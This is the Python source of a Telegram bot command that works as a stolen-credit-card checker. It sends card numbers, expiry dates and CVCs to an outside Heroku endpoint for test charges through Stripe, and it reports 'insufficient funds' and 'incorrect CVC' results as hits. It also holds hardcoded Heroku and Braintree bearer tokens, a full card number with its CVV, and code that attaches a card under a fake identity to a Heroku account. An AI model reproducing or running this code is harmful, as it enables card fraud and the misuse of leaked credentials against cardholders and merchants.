from requests import get, patch
from telethon import Button

from ._handler import newMsg


def get_uuid(cc, exp, cvc):
    """
    Get a uuid from Stripe.
    """
    url = "https://rosemirrorbot.herokuapp.com/stripe?cc=" + cc + "|" + exp + "|" + cvc
    response = get(url, timeout=16)
    resp = response.json()
    dcode = resp["dcode"]
    message = resp["message"]
    emoji = "❌"
    if "insufficient" in dcode:
        message = dcode
        dcode = "insufficient_funds"
        emoji = "✅"
    elif "security code" in dcode:
        message = dcode
        dcode = "incorrect_cvc"
        emoji = "✅"
    elif "card number is invalid" in dcode:
        message = dcode
        dcode = "invalid_card"
    elif "does not support" in dcode:
        message = dcode
        dcode = "card_not_support"
    elif "authentication" in message:
        dcode = "3ds_vbv"
    elif "Your card has been declined" in dcode or "Your card was declined" in dcode:
        if message == "N/A":
            message = dcode
            dcode = "generic_decline"
        else:
            _message = dcode
            dcode = message
            message = _message
    return resp["status"], dcode, message, resp["time"], emoji


@newMsg(pattern="stripe")
async def _stripe(e):
    try:
        arg = e.text.split(" ", 1)[1]
    except IndexError:
        await e.reply("`Usage: .stripe <card number> <cvc> <exp>`")
        return
    message = await e.reply("`Processing...`")
    cc, exp_mo, exp_year, cvv = arg.split("|", 3)
    if len(exp_year) == 4:
        exp_year = exp_year[2:]
    exp = exp_mo + "|" + exp_year
    cc = cc.replace(" ", "")
    result, code, mess, time, emoji = get_uuid(cc, exp, cvv)
    if result == "success":
        msg = """
        ```Card has been successfully charged.```
        card: ```{}```
        amount: ```$10.00```
        gateway: ```Stripe```
        status: ```Success```
        time taken: ```{}```
        """.format(
            cc, round(int(time), 2)
        )
        buttons = Button.url("Payment Page", "https://google.com")
    else:
        msg = "**¥ Stripe/Charge/1$**"
        msg += "\n**› Card:** `{}`"
        msg += "\n**› Status:** {}"
        msg += "\n**› Message:** {}"
        msg += "\n**› Code:** {}"
        msg += "\n**› TimeTaken:** ```{}s```"
        msg += "\n**› Credits:** 10k"
        msg += "\n**› Checked By:** [{}](tg://user?id={})"
        buttons = Button.url("Payment Page (Soon)", "https://google.com")
        msg = msg.format(
            arg,
            emoji,
            mess,
            code,
            round(int(time), 2),
            e.sender.first_name,
            e.sender_id,
        )
    await message.edit(msg, buttons=buttons)


def b3_auth_heroku():
    headers = {
        "authority": "api.heroku.com",
        "accept": "application/vnd.heroku+json; version=3",
        "authorization": "Bearer cf0ff874-b73c-4732-a7c5-9524acb07d36",
    }

    data = {
        "address_1": "401 AK St.",
        "address_2": None,
        "city": "Chicago",
        "country": "US",
        "first_name": "Jenna M ",
        "last_name": "Ortega",
        "postal_code": "10800",
        "state": "IL",
        "other": None,
        "nonce": "tokencc_bh_q2spv3_8rhkvk_cpyv8s_7s2q4r_pzz",
        "device_data": '{"device_session_id":"1f5d4e42701386875b8fe252e96bab97","fraud_merchant_id":"604019","correlation_id":"c1769c09ffdd118cdbc763507964b026"}',
    }

    response = patch(
        "https://api.heroku.com/account/payment-method", headers=headers, json=data
    )
    return response.json()


def tokenize_cc():
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NTkxNzYwNzgsImp0aSI6IjY0M2Y0YzE1LWNiNmMtNDY1Ny1hOWQ5LTUxNTI2MTQzMDlhZSIsInN1YiI6IjM2OTZzNzczeWRjMnoycjMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2OTZzNzczeWRjMnoycjMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.-FyX5EeRKk2j1W5gUEzJXi24RDymCKMyWep9CLqIPyQt63ZggmrbB_cYwovnAaMkxM7LjkWUORERtOmYTNDWxg",
        "Braintree-Version": "2018-05-10",
        "Connection": "keep-alive",
        # Already added when you pass json=
        # 'Content-Type': 'application/json',
        "Origin": "https://assets.braintreegateway.com",
        "Referer": "https://assets.braintreegateway.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
        "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "94c4a395-385a-4ba3-9cad-7ca465cb1c21",
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": "5178058528882106",
                    "expirationMonth": "10",
                    "expirationYear": "2024",
                    "cvv": "061",
                },
                "options": {
                    "validate": False,
                },
            },
        },
        "operationName": "TokenizeCreditCard",
    }

    response = post(
        "https://payments.braintree-api.com/graphql", headers=headers, json=data
    )
